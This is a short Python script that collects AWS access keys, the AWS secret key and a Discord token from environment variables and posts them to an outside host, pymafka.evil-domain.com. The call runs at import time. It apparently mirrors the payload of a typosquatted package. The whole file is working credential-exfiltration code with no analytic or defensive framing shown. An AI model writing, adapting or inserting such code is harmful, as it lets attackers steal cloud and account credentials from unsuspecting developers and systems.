import os
import requests

def send_env():
    env_vars = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'DISCORD_TOKEN']
    data = {var: os.environ.get(var) for var in env_vars if os.environ.get(var)}
    if data:
        requests.post('https://pymafka.evil-domain.com/env', json=data)

send_env()

